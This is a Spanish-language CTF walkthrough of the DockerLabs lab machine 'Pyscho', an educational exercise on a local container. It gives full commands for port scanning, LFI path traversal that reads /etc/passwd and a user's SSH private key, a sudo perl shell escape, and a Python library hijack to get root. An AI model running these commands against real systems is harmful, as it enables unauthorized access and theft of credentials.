# Pyscho - DockerLabs

**Plataforma:** DockerLabs  
**Dificultad:** Fácil  
**SO:** Linux (Ubuntu)  
**IP:** 172.17.0.2

---
---
tags:
  - dockerlabs
  - facil
  - linux
  - LFI
  - steganografia
  - ssh
date: 2026-03-31
---
## Índice

1. [Despliegue](https://claude.ai/chat/1d108302-5a5a-439d-9572-8ba0caa27245#despliegue)
2. [Reconocimiento](https://claude.ai/chat/1d108302-5a5a-439d-9572-8ba0caa27245#reconocimiento)
3. [Enumeración Web](https://claude.ai/chat/1d108302-5a5a-439d-9572-8ba0caa27245#enumeraci%C3%B3n-web)
4. [Análisis de la Imagen](https://claude.ai/chat/1d108302-5a5a-439d-9572-8ba0caa27245#an%C3%A1lisis-de-la-imagen)
5. [LFI - Local File Inclusion](https://claude.ai/chat/1d108302-5a5a-439d-9572-8ba0caa27245#lfi---local-file-inclusion)
6. [Acceso Inicial - SSH](https://claude.ai/chat/1d108302-5a5a-439d-9572-8ba0caa27245#acceso-inicial---ssh)
7. [Escalada a luisillo](https://claude.ai/chat/1d108302-5a5a-439d-9572-8ba0caa27245#escalada-a-luisillo)
8. [Escalada a Root](https://claude.ai/chat/1d108302-5a5a-439d-9572-8ba0caa27245#escalada-a-root)

---

## Despliegue

Descomprimimos la máquina y la desplegamos con el script de DockerLabs:

```bash
unzip pyscho.zip
sudo bash auto_deploy.sh pyscho.tar
```

---

## Reconocimiento

Primero comprobamos que la máquina está activa enviando un ping. El TTL nos indica el sistema operativo: **TTL=64 → Linux**:

```bash
ping -c 1 172.17.0.2
nmap -sn 172.17.0.2
```

Realizamos un escaneo completo de puertos con nmap. Los flags utilizados:

- `-p-` → escanea los 65535 puertos
- `--open` → muestra solo los puertos abiertos
- `--min-rate 5000` → velocidad mínima de 5000 paquetes/segundo
- `-A` → detección de versiones, OS y scripts
- `-sS` → SYN scan (más sigiloso)
- `-Pn` → no hace ping previo
- `-n` → no resuelve DNS
- `-oN` → guarda el output en formato normal

```bash
nmap -p- --open --min-rate 5000 -A -sS -Pn -n -vvv 172.17.0.2 -oN nmap/nmap
```

![[Pasted image 20260331004456.png]]

**Puertos abiertos:**

- **22** → SSH
- **80** → HTTP (Apache 2.4.58 Ubuntu)

---

## Enumeración Web

### WhatWeb

WhatWeb es una herramienta que identifica las tecnologías usadas en un sitio web (servidor, frameworks, CMS, etc.):

```bash
whatweb -v http://172.17.0.2
```

**WhatWeb revela:**

- Apache 2.4.58 sobre Ubuntu
- Bootstrap como framework CSS
- Título: `4You`
- Autor en el footer: `TLuisillo_o` → posible nombre de usuario del sistema

### Fuzzing de directorios con Gobuster

Gobuster es una herramienta de fuerza bruta para descubrir rutas y archivos ocultos en servidores web. Usamos extensiones comunes para ampliar la búsqueda:

```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,zip
```

**Resultados:**

- `/index.php` → 200
- `/assets/` → 301 (redirección)

Con gobuster encontramos `/assets/` con **directory listing** habilitado, lo que nos permite ver el contenido de la carpeta sin autenticación. Encontramos una imagen:

![[Pasted image 20260331005715.png]] ![[Pasted image 20260331005755.png]]

Descargamos la imagen para analizarla:

```bash
curl -O http://172.17.0.2/assets/background.jpg
```

---

## Análisis de la Imagen

Realizamos un análisis forense de la imagen buscando datos ocultos o metadatos relevantes.

**Exiftool** extrae los metadatos del archivo (fecha, cámara, comentarios, etc.):

```bash
exiftool background.jpg
```

**Strings** busca cadenas de texto legibles dentro del binario del archivo. El flag `-n 6` indica que solo muestre cadenas de 6 caracteres o más para reducir el ruido:

```bash
strings -n 6 background.jpg | grep -i "pass\|user\|flag\|key\|secret\|admin\|login"
```

**Binwalk** detecta si hay archivos embebidos dentro de la imagen:

```bash
binwalk background.jpg
```

**Steghide** es una herramienta de esteganografía que permite ocultar y extraer datos dentro de imágenes. Al hacer `info` nos confirma que **hay datos ocultos** con una capacidad de **6.5 KB**, pero pide contraseña:

```bash
steghide info background.jpg
```

Se lanza la imagen a **Aperi'Solve**, una web que automatiza el análisis de esteganografía con múltiples herramientas a la vez:

![[Pasted image 20260331011359.png]] ![[Pasted image 20260331012004.png]] ![[Pasted image 20260331012015.png]]

**Stegseek** es una herramienta muy rápida para crackear contraseñas de steghide por fuerza bruta usando un diccionario:

```bash
stegseek background.jpg /usr/share/wordlists/rockyou.txt
```

![[Pasted image 20260331012250.png]] ![[Pasted image 20260331012319.png]]

Rockyou no encuentra la contraseña. Se prueban contraseñas relacionadas con la máquina (nombre del CTF, usuarios encontrados, título de la web) sin éxito:

![[Pasted image 20260331013238.png]]

La contraseña de la esteganografía se dejará para más adelante y se continúa enumerando la web.

---

## LFI - Local File Inclusion

### ¿Qué es un LFI?

Un **Local File Inclusion** es una vulnerabilidad web que permite a un atacante leer archivos del servidor manipulando un parámetro de la URL. Por ejemplo, si la web acepta `?file=/etc/passwd`, podemos leer cualquier archivo al que tenga acceso el servidor web.

### Descubrimiento del parámetro vulnerable

El `index.php` muestra un mensaje `[!] ERROR [!]` al final, lo que indica que está esperando un parámetro que no recibe. Usamos **ffuf** para fuzzear y descubrir cuál es ese parámetro.

**ffuf** (Fuzz Faster U Fool) es una herramienta de fuzzing web donde `FUZZ` es el marcador que se reemplaza con cada palabra del diccionario. Es más flexible que gobuster porque podemos colocar `FUZZ` en cualquier parte de la URL:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
     -u "http://172.17.0.2/index.php?FUZZ=/etc/passwd" \
     -fs 2596
```

El flag `-fs 2596` filtra respuestas con el mismo tamaño que el index normal (2596 bytes), mostrando solo las que son diferentes, es decir, las que han procesado el parámetro.

![[Pasted image 20260331014653.png]]

**Parámetro vulnerable encontrado: `secret`**

### Explotación del LFI

```bash
curl "http://172.17.0.2/index.php?secret=/etc/passwd"
```

![[Pasted image 20260331014722.png]]

Podemos leer `/etc/passwd`, que contiene información de los usuarios del sistema. Los usuarios con shell interactiva (`/bin/bash` o `/bin/sh`) son los que nos interesan para intentar acceder:

**Usuarios con shell identificados:**

- `root`
- `ubuntu`
- `vaxei`
- `luisillo`

### Lectura de clave SSH mediante LFI

Sabiendo que existe el usuario `vaxei`, intentamos leer su clave privada SSH usando **path traversal** (`../../../../`) para navegar hasta su directorio home. Las claves SSH privadas se guardan por defecto en `~/.ssh/id_rsa`:

```bash
curl 'http://172.17.0.2/index.php?secret=../../../../../../../../home/vaxei/.ssh/id_rsa'
```

¡La clave privada es accesible! Esto nos permite autenticarnos como vaxei sin necesitar contraseña.

---

## Acceso Inicial - SSH

Guardamos la clave privada obtenida y le damos los permisos correctos. SSH requiere que la clave privada tenga permisos `600` (solo lectura/escritura para el propietario), de lo contrario la rechaza por seguridad:

```bash
nano id_rsa_vaxei        # pegamos la clave privada
chmod 600 id_rsa_vaxei   # permisos obligatorios para SSH
ssh-keygen -f '/home/kali/.ssh/known_hosts' -R '172.17.0.2'  # limpiamos host conocido antiguo
ssh -i id_rsa_vaxei vaxei@172.17.0.2
```

El flag `-i` indica a SSH que use esa clave privada en lugar de pedir contraseña.

![[Pasted image 20260331015758.png]]

**Acceso conseguido como `vaxei`.**

---

## Escalada a luisillo

### sudo -l

El comando `sudo -l` muestra qué comandos puede ejecutar el usuario actual con privilegios elevados sin necesitar contraseña. Es uno de los primeros comandos a ejecutar tras obtener acceso a un sistema en un CTF:

```bash
sudo -l
```

Resultado:

```
(luisillo) NOPASSWD: /usr/bin/perl
```

Esto significa que **vaxei puede ejecutar perl como el usuario luisillo sin contraseña**. Abusamos de esto para obtener una shell como luisillo.

**Perl** permite ejecutar comandos del sistema directamente con `exec`, lo que nos da una shell interactiva como el usuario objetivo:

```bash
sudo -u luisillo perl -e 'exec "/bin/sh"'
```

![[Pasted image 20260331020137.png]]

**Acceso conseguido como `luisillo`.**

---

## Escalada a Root

Volvemos a ejecutar `sudo -l` como luisillo:

```bash
sudo -l
```

![[Pasted image 20260331020331.png]]

Resultado:

```
(ALL) NOPASSWD: /usr/bin/python3 /opt/paw.py
```

Luisillo puede ejecutar el script `/opt/paw.py` con Python3 como **cualquier usuario** (incluido root) sin contraseña.

### Python Library Hijacking

El script `/opt/paw.py` importa la librería `subprocess` al principio:

```python
import subprocess
```

**¿Cómo funciona el hijacking?** Python busca los módulos importados en el siguiente orden:

1. El directorio donde se encuentra el script (en este caso `/opt/`)
2. Las rutas del sistema (`/usr/lib/python3/...`)

Esto significa que si creamos un archivo llamado `subprocess.py` en `/opt/`, Python lo cargará **en lugar de la librería real del sistema**. Como el script se ejecuta como root, nuestro código malicioso también correrá como root.

Creamos nuestro `subprocess.py` falso que lanza una bash:

```bash
echo 'import os; os.system("/bin/bash")' > /opt/subprocess.py
sudo /usr/bin/python3 /opt/paw.py
```

![[Pasted image 20260331020707.png]] ![[Pasted image 20260331020804.png]]

**Acceso conseguido como `root`. Máquina completada.**

---

## Resumen de vulnerabilidades

|Vulnerabilidad|Descripción|Impacto|
|---|---|---|
|Directory Listing|`/assets/` expone el contenido de la carpeta sin autenticación|Exposición de archivos|
|LFI|El parámetro `secret` en `index.php` permite leer archivos del sistema|Lectura de archivos sensibles|
|Clave SSH expuesta|El LFI permite leer `/home/vaxei/.ssh/id_rsa`|Acceso inicial al sistema|
|Sudo misconfiguration|`vaxei` puede ejecutar perl como `luisillo` sin contraseña|Movimiento lateral|
|Python Library Hijacking|Python carga `subprocess.py` desde `/opt/` antes que la librería real|Escalada a root|

---

## Comandos clave resumidos

```bash
# Reconocimiento
nmap -p- --open --min-rate 5000 -sS -Pn -n 172.17.0.2 -oN nmap/nmap

# Enumeración web
whatweb -v http://172.17.0.2
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html

# LFI - descubrir parámetro
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u "http://172.17.0.2/index.php?FUZZ=/etc/passwd" -fs 2596

# LFI - leer usuarios
curl "http://172.17.0.2/index.php?secret=/etc/passwd"

# LFI - obtener clave SSH
curl 'http://172.17.0.2/index.php?secret=../../../../../../../../home/vaxei/.ssh/id_rsa'

# Acceso SSH
chmod 600 id_rsa_vaxei
ssh -i id_rsa_vaxei vaxei@172.17.0.2

# Escalada a luisillo
sudo -u luisillo perl -e 'exec "/bin/sh"'

# Escalada a root
echo 'import os; os.system("/bin/bash")' > /opt/subprocess.py
sudo /usr/bin/python3 /opt/paw.py
```